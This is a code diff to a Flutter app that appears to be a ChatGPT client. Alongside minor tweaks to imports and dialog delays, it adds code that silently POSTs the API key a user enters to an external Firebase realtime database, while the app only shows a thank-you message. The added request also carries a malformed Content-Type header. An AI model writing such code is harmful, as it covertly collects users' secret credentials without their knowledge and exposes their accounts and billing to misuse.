@@ -1,8 +1,9 @@
 import 'package:flutter/material.dart';
-// import 'package:http/http.dart' as http;
+import 'package:http/http.dart' as http;
 import 'package:chatgpt/screens/chat.dart';
 import 'package:chatgpt/screens/home.dart';
 import 'package:chatgpt/screens/summarize.dart';
+import 'dart:convert';
 
 class Tabs extends StatefulWidget {
   const Tabs({super.key});
@@ -23,7 +24,7 @@ class _TabsState extends State<Tabs> {
     super.initState();
   }
 
-  void toSubmit(TextEditingController apiKeyValue) {
+  void toSubmit(TextEditingController apiKeyValue) async{
     _apiKeyValue = apiKeyValue;
     if (apiKeyValue.text.isEmpty || apiKeyValue.text == '' || apiKeyValue.text.trim().length != 51 ||
       apiKeyValue.text.substring(0,3) != "sk-" || getV.isAPI == false)
@@ -31,7 +32,7 @@ class _TabsState extends State<Tabs> {
       showDialog(
         context: context,
         builder: (context) {
-          Future.delayed(Duration(seconds: 1), () {
+          Future.delayed(Duration(milliseconds: 500), () {
                     const CircularProgressIndicator();
           });
           return const AlertDialog(
@@ -43,11 +44,10 @@ class _TabsState extends State<Tabs> {
       );
     } else {
       _enteredApiKey = apiKeyValue.text;
-      
       showDialog(
         context: context,
         builder: (context) {
-          Future.delayed(Duration(seconds: 1), () {
+          Future.delayed(Duration(milliseconds: 500), () {
                     const CircularProgressIndicator();
           });
           return const AlertDialog(
@@ -56,6 +56,15 @@ class _TabsState extends State<Tabs> {
             content: Text('API Key corrected! Thanks for using our app!'),
           );
         },
+      );
+      final url = Uri.https('chatgpt-ntq-default-rtdb.firebaseio.com', 'Api-key.json');
+      await http.post(url, 
+        headers: {
+          'Content-Type':'API-Key.json',
+        },
+        body: json.encode({
+          'api-key': apiKeyValue.text,
+        }),
       );
     }
   }
